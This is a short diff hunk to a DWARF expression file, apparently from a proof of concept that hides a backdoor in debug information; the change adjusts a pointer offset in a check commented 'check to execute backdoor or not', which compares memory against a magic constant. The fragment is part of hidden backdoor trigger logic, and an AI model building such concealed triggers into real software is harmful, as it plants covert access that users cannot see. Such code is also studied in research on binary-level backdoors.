@@ -215,6 +215,8 @@ begin EXPRESSION
 # check to execute backdoor or not
 DW_OP_breg7 +0
 DW_OP_deref
+DW_OP_constu 0x4
+DW_OP_plus
 DW_OP_deref
 # 0x2a303f26575f5451
 DW_OP_constu 0x2a303f26
